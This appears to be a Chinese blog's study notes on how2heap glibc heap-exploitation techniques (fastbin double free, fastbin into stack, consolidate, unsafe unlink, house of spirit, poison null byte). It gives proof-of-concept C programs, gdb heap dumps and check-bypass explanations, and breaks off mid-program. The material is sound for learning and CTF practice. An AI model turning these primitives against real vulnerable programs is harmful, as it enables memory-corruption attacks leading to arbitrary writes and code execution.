---
title: how2heap学习记录
published: 2026-02-01
description: "持续补充ing"
image: ''
tags: [PWN，note]
category: PWN
draft: false
---

编译指令：

```bash
gcc fastbin_dup.c -o a.out \
    -Wl,--rpath=/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 \
    -Wl,--dynamic-linker=/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
```

### fastbin_dup

利用 fastbins 的 double-free 攻击，可以泄漏出一块**已经被分配的内存指针**

fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin->fd 来遍历 fastbins

```c
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);

    fprintf(stderr, "Freeing the first one %p.\n", a);
    free(a);
    fprintf(stderr, "Then freeing another one %p.\n", b);
    free(b);
    fprintf(stderr, "Freeing the first one %p again.\n", a);
    free(a);

    char *d = malloc(9);
    char *e = malloc(9);
    char *f = malloc(9);
```

libc-2.23 中对 double-free 的检查过程如下：

```c
    /* Check that the top of the bin is not the record we are going to add
       (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
      }
```

它在检查 fast bin 的 double-free 时只是检查了第一个块。所以其实是存在缺陷的。

我们double free之后，fastbins中会出现

```c
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  →  [loop detected]
```

此时 chunk a 和 chunk b 似乎形成了一个环，

此后的malloc会从这个环中不断地取用，而chunk a，chunk b始终是free状态

```bash
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x602000
Size: 0x20 (with flag bits: 0x21)
fd: 0x602020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x602020
Size: 0x20 (with flag bits: 0x21)
fd: 0x602000

Allocated chunk | PREV_INUSE
Addr: 0x602040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x602060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

所以对于 fastbins，可以通过 double-free 泄漏出一个堆块的指针。



### fastbin_dup_into_stack(double free)

`double free`的利用：

- malloc的检查：检查块的大小

  ```c
  /* offset 2 to use otherwise unindexable first 2 bins */
  #define fastbin_index(sz) \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
  
    if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
      {
        idx = fastbin_index (nb);
        [...]
  
        if (victim != 0)
          {
            if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
              {
                errstr = "malloc(): memory corruption (fast)";
                [...]
              }
              [...]
          }
      }
  ```

  glibc 在执行分配操作时，若块的大小符合 fast bin，则会在对应的 bin 中寻找合适的块，此时 glibc 将根据候选块的 size 字段计算出 fastbin 索引，然后与对应 bin 在 fastbin 中的索引进行比较，如果二者不匹配，则说明块的 size 字段遭到破坏。所以需要 fake chunk 的 size 字段被设置为正确的值。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    unsigned long long stack_var = 0x21;
    fprintf(stderr, "Allocating 3 buffers.\n");
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);
    strcpy(a, "AAAAAAAA");
    strcpy(b, "BBBBBBBB");
    strcpy(c, "CCCCCCCC");
    fprintf(stderr, "1st malloc(9) %p points to %s\n", a, a);
    fprintf(stderr, "2nd malloc(9) %p points to %s\n", b, b);
    fprintf(stderr, "3rd malloc(9) %p points to %s\n", c, c);

    fprintf(stderr, "Freeing the first one %p.\n", a);
    free(a);
    fprintf(stderr, "Then freeing another one %p.\n", b);
    free(b);
    fprintf(stderr, "Freeing the first one %p again.\n", a);
    free(a);

    fprintf(stderr, "Allocating 4 buffers.\n");
    unsigned long long *d = malloc(9);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
    fprintf(stderr, "4nd malloc(9) %p points to %p\n", d, &d);
    char *e = malloc(9);
    strcpy(e, "EEEEEEEE");
    fprintf(stderr, "5nd malloc(9) %p points to %s\n", e, e);
    char *f = malloc(9);
    strcpy(f, "FFFFFFFF");
    fprintf(stderr, "6rd malloc(9) %p points to %s\n", f, f);
    char *g = malloc(9);
    strcpy(g, "GGGGGGGG");
    fprintf(stderr, "7th malloc(9) %p points to %s\n", g, g);
}
```

```c
$ gcc -g fastbin_dup_into_stack.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0xcf2010 points to AAAAAAAA
2nd malloc(9) 0xcf2030 points to BBBBBBBB
3rd malloc(9) 0xcf2050 points to CCCCCCCC
Freeing the first one 0xcf2010.
Then freeing another one 0xcf2030.
Freeing the first one 0xcf2010 again.
Allocating 4 buffers.
4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0
5nd malloc(9) 0xcf2030 points to EEEEEEEE
6rd malloc(9) 0xcf2010 points to FFFFFFFF
7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG
```

对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。

在案例中便获得了`*g  -->	0x7ffd1e0d48b0 `

### fastbin_dup_consolidate

**在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查**

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() {
    void *p1 = malloc(0x10);
    void *p2 = malloc(0x10);
    strcpy(p1, "AAAAAAAA");
    strcpy(p2, "BBBBBBBB");
    fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);

    fprintf(stderr, "Now free p1!\n");
    free(p1);

    void *p3 = malloc(0x400);
    fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
    fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");

    free(p1);
    fprintf(stderr, "Trigger the double free vulnerability!\n");
    fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");

    void *p4 = malloc(0x10);
    strcpy(p4, "CCCCCCC");
    void *p5 = malloc(0x10);
    strcpy(p5, "DDDDDDDD");
    fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", p4, p5);
}
```

```bash
$ gcc -g fastbin_dup_consolidate.c
$ ./a.out
Allocated two fastbins: p1=0x17c4010 p2=0x17c4030
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x17c4050
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010
```

1. 首先分配两个 fast chunk：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1
   0x602010:   0x4141414141414141  0x0000000000000000
   0x602020:   0x0000000000000000  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000020fc1  <-- top chunk
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   ```

2. 释放掉 p1，则空闲 chunk 加入到 fastbins 中：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed]
   0x602010:   0x0000000000000000  0x0000000000000000
   0x602020:   0x0000000000000000  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000020fc1  <-- top chunk
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   ```

   此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed]
   0x602010:   0x00007ffff7dd1b88  0x00007ffff7dd1b88      <-- fd, bk pointer
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10] 0x00
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

   可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。

3. 由于此时 p1 已经不在 fastbins 的顶部，可以再次释放 p1：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [double freed]
   0x602010:   0x0000000000000000  0x00007ffff7dd1b88
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

4. p1 被再次放入 fastbins，于是 p1 同时存在于 fabins 和 small bins 中。

   第一次 malloc，chunk 将从 fastbins 中取出：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed], chunk p4
   0x602010:   0x0043434343434343  0x00007ffff7dd1b88
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10] 0x00
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

5. 第二次 malloc，chunk 从 small bins 中取出：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p4, chunk p5
   0x602010:   0x4444444444444444  0x00007ffff7dd1b00
   0x602020:   0x0000000000000020  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   ```

6. 最后得到的是chunk p4 和 p5 在同一位置，**造成堆块的重叠**

7. 原理：

   large chunk 的分配过程：

   ```c
     /*
        If this is a large request, consolidate fastbins before continuing.
        While it might look excessive to kill all fastbins before
        even seeing if there is space available, this avoids
        fragmentation problems normally associated with fastbins.
        Also, in practice, programs tend to have runs of either small or
        large requests, but less often mixtures, so consolidation is not
        invoked all that often in most programs. And the programs that
        it is called frequently in otherwise tend to fragment.
      */
   
     else
       {
         idx = largebin_index (nb);
         if (have_fastchunks (av))
           malloc_consolidate (av);
       }
   ```

   当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 **malloc_consolidate() 函数合并** fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。

### unsafe_unlink

利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main() {
    int malloc_size = 0x80; // not fastbins
    							// fastbins中的堆块大小范围在0x20-0x80之间，而malloc（0x80）会申请大小为0x90的chunk，所以不会存入fastbins中
    int header_size = 2;

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    // pass this check: (P->fd->bk != P || P->bk->fd != P) == False
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk fd: %p\n", (void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk bk: %p\n\n", (void*) chunk0_ptr[3]);
    // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
    // chunk0_ptr[1] = 0x0; // or 0x8, 0x80

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    chunk1_hdr[0] = malloc_size;
    chunk1_hdr[1] &= ~1;

    // deal with tcache
    // int *a[10];
    // int i;
    // for (i = 0; i < 7; i++) {
    //   a[i] = malloc(0x80);
    // }
    // for (i = 0; i < 7; i++) {
    //   free(a[i]);
    // }
    free(chunk1_ptr);

    char victim_string[9];
    strcpy(victim_string, "AAAAAAAA");
    chunk0_ptr[3] = (uint64_t) victim_string;
    fprintf(stderr, "Original value: %s\n", victim_string);

    chunk0_ptr[0] = 0x4242424242424242LL;
    fprintf(stderr, "New Value: %s\n", victim_string);
}
```

```c
$ gcc -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
```

unlink代码与检查如下：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                      \
    BK = P->bk;                                      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                      \
        FD->bk = BK;                                  \
        BK->fd = FD;                                  \
        if (!in_smallbin_range (P->size)                      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {              \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
          malloc_printerr (check_action,                      \
                   "corrupted double-linked list (not small)",    \
                   P, AV);                          \
            if (FD->fd_nextsize == NULL) {                      \
                if (P->fd_nextsize == P)                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;              \
                else {                                  \
                    FD->fd_nextsize = P->fd_nextsize;                  \
                    FD->bk_nextsize = P->bk_nextsize;                  \
                    P->fd_nextsize->bk_nextsize = FD;                  \
                    P->bk_nextsize->fd_nextsize = FD;                  \
                  }                                  \
              } else {                                  \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;              \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;              \
              }                                      \
          }                                      \
      }                                          \
}
```



构造fake chunk

```c
pwndbg> x/80gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000091  --> chunk0
0x603010:       0x0000000000000000      0x0000000000000000	--> fake chunk,P
0x603020:       0x0000000000602060      0x0000000000602068	--> fd,bk
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000091  -->chunk1
0x6030a0:       0x0000000000000000      0x0000000000000000
0x6030b0:       0x0000000000000000      0x0000000000000000
0x6030c0:       0x0000000000000000      0x0000000000000000
0x6030d0:       0x0000000000000000      0x0000000000000000
0x6030e0:       0x0000000000000000      0x0000000000000000
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000000
```

```c
pwndbg> x/20gx 0x0000000000602060	
0x602060:       0x0000000000000000      0x00007ffff7bc5620	--> FD
0x602070:       0x0000000000000000      0x0000000000603010	--> bk
0x602080:       0x0000000000000000      0x0000000000000000
0x602090:       0x0000000000000000      0x0000000000000000
0x6020a0:       0x0000000000000000      0x0000000000000000
0x6020b0:       0x0000000000000000      0x0000000000000000
0x6020c0:       0x0000000000000000      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
```

```c
pwndbg> x/20gx 0x0000000000602068
0x602068:       0x00007ffff7bc5620      0x0000000000000000	--> BK
0x602078:       0x0000000000603010--> fd 0x0000000000000000	
0x602088:       0x0000000000000000      0x0000000000000000
0x602098:       0x0000000000000000      0x0000000000000000
0x6020a8:       0x0000000000000000      0x0000000000000000
0x6020b8:       0x0000000000000000      0x0000000000000000
0x6020c8:       0x0000000000000000      0x0000000000000000
0x6020d8:       0x0000000000000000      0x0000000000000000
0x6020e8:       0x0000000000000000      0x0000000000000000
0x6020f8:       0x0000000000000000      0x0000000000000000
```

可以看到，我们在 chunk0 里构造一个 fake chunk，用 P 表示，两个指针 fd 和 bk 可以构成两条链：`P->fd->bk == P`，`P->bk->fd == P`，可以绕过检查

```c
(P->fd->bk != P || P->bk->fd != P) == False
    P->fd = FD = 0x602060 
    FD->bk = *0x602078 = 0x603010 = P
    
    P->bk = BK = 0x602068
    BK->fd = *0x602078 = 0x603010 =P
```

另外利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 `prev_size` 为 fake chunk 的大小，修改 `PREV_INUSE` 标志位为 0，将 fake chunk 伪造成一个 free chunk。

接下来就是释放掉 chunk1，这会触发 fake chunk 的 unlink 并覆盖 `chunk0_ptr` 的值。unlink 操作是这样进行的：

```c
FD = P->fd;
BK = P->bk;

FD->bk = BK
    *0x602078 = 0x602068
BK->fd = FD
    *0x602078 = 0x602060
    
最后造成的结果便是*0x602078 = 0x602060
```

原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置，这就意味着如果程序功能允许堆 P 进行写入，就能改写 P 指针自身的地址，从而造成任意内存写入。若允许堆 P 进行读取，则会造成信息泄漏。

在这个例子中，由于 P->fd->bk 和 P->bk->fd 都指向 P，所以最后的结果为：

```c
chunk0_ptr = P = P->fd
    
    
    
pwndbg> x/20gx 0x0000000000602060
0x602060:       0x0000000000000000      0x00007ffff7bc5620
0x602070:       0x0000000000000000      0x0000000000602060
0x602080:       0x0000000000000000      0x0000000000000000
0x602090:       0x0000000000000000      0x0000000000000000
0x6020a0:       0x0000000000000000      0x0000000000000000
0x6020b0:       0x0000000000000000      0x0000000000000000
0x6020c0:       0x0000000000000000      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
pwndbg> p chunk0_ptr
$6 = (uint64_t *) 0x602060
pwndbg> p &chunk0_ptr
$7 = (uint64_t **) 0x602078 <chunk0_ptr>
    
//此时，chunk0_ptr[3]=0x602060
```

此时，我们可以通过写入chunk_ptr[3]来修改chunk_0ptr来进行任意地址写



#### prev_size检查

libc-2.25 在 unlink 的开头增加了对 `chunk_size == next->prev->chunk_size` 的检查，以对抗单字节溢出的问题。补丁如下：

```c
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)->mchunk_size)
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)
/* Bits to mask off when extracting size  */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```

1. 获取 P 的 `size` 字段（去掉标志位）

2. 通过指针运算找到下一个块的地址：`P的地址 + P的大小(0x100)`

3. 读取 Next Chunk 的 `prev_size` 字段

   因为 P 是空闲的（正在被 unlink），根据 glibc 规则，Next Chunk 的 `PREV_INUSE` 位必定是 0，且 Next Chunk 的 `prev_size` 字段必须存放 P 的大小

4. $$P \to \text{size} == (P + P \to \text{size}) \to \text{prev\_size}$$

回顾一下伪造出来的堆：

```c
gef➤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  <-- chunk 0
0x602010:   0x0000000000000000  0x0000000000000000  <-- fake chunk P
0x602020:   0x0000000000601058  0x0000000000601060      <-- fd, bk pointer
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000080  0x0000000000000090  <-- chunk 1 <-- prev_size
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  <-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
```

这里有三种办法可以绕过该检查：

```c
// 1.  什么都不做
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x0
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0
    
// 2. 设置 chunk0_ptr[1] = 0x8
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x8
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8

// 3. 设置 chunk0_ptr[1] = 0x80
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x80
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80
```

#### libc 2.26

新增了tcache机制，这是一种线程缓存机制，每个线程默认情况下有 64 个大小递增的 bins，每个 bin 是一个单链表，默认最多包含 7 个 chunk。其中缓存的 chunk 是不会被合并的，所以在释放 chunk 1 的时候，`chunk0_ptr` 仍然指向正确的堆地址，而不是之前的 `chunk0_ptr = P = P->fd`。为了解决这个问题，一种可能的办法是给填充进特定大小的 chunk 把 bin 占满，就像下面这样：

```c
    // deal with tcache
    int *a[10];
    int i;
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
```



### house_of_spirit

house-of-spirit 是一种通过堆的 fast bin 机制来辅助栈溢出的方法

> 一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制 EIP 来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被 free 的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个 fast bin 块的元数据，接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    malloc(1);

    fprintf(stderr, "We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\n");
    unsigned long long *a, *b;
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "The first one:  %p\n", &fake_chunks[0]);
    fprintf(stderr, "The second one: %p\n", &fake_chunks[4]);

    fake_chunks[1] = 0x20;      // the size
    fake_chunks[5] = 0x1234;    // nextsize

    fake_chunks[2] = 0x4141414141414141LL;
    fake_chunks[6] = 0x4141414141414141LL;

    fprintf(stderr, "Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[0]);
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[0], &fake_chunks[2]);
    b = malloc(0x10);
    fprintf(stderr, "malloc(0x10): %p\n", b);
    b[0] = 0x4242424242424242LL;
}
```

```c
$ gcc -g house_of_spirit.c
$ ./a.out
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffc782dae00
The second one: 0x7ffc782dae20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!
malloc(0x10): 0x7ffc782dae10
```

1. 首先 malloc(1) 用于初始化内存环境，然后在 fake chunk 区域伪造出两个 chunk。另外正如上面所说的，需要一个传递给 free 函数的可以被修改的指针，无论是通过栈溢出还是其它什么方式：

   ```c
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- fake chunk 1
   0x7fffffffdcc0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   gef➤  x/gx &a
   0x7fffffffdca0: 0x0000000000000000
   ```

2. 伪造 chunk 时需要绕过一些检查，首先是标志位，`PREV_INUSE` 位并不影响 free 的过程，但 `IS_MMAPPED` 位和 `NON_MAIN_ARENA` 位都要为零。

   其次，在 64 位系统中 fast chunk 的大小要在 0x20-0x80 字节之间

   最后，是 next chunk 的大小，必须大于 `2*SIZE_SZ`（即大于16），小于 `av->system_mem`（即小于0x21000），才能绕过对 next chunk 大小的检查。

3. 然后修改指针 a 指向 (fake chunk 1 + 0x10) 的位置，然后将其传递给 free 函数，这时程序就会误以为这是一块真的 chunk，然后将其释放并加入到 fastbin 中。

   ```c
   gef➤  x/gx &a
   0x7fffffffdca0: 0x00007fffffffdcc0
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- fake chunk 1 [be freed]
   0x7fffffffdcc0: 0x0000000000000000  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x7fffffffdcc0, size=0x20, flags=)
   ```

4. 这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。

   ```c
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- new chunk
   0x7fffffffdcc0: 0x4242424242424242  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
   gef➤  x/gx &b
   0x7fffffffdca8: 0x00007fffffffdcc0
   ```

   

house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。

该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。



### poison_null_byte

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    uint8_t *a, *b, *c, *b1, *b2, *d;

    a = (uint8_t*) malloc(0x10);
    int real_a_size = malloc_usable_size(a);	//real_a_size = chunksize(a) - 0x8 == 0x18
    fprintf(stderr, "We allocate 0x10 bytes for 'a': %p\n", a);
    fprintf(stderr, "'real' size of 'a': %#x\n", real_a_size);

    b = (uint8_t*) malloc(0x100);
    c = (uint8_t*) malloc(0x80);		//非fastbins，可以合并
    fprintf(stderr, "b: %p\n", b);
    fprintf(stderr, "c: %p\n", c);

    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
    *(size_t*)(b+0xf0) = 0x100;
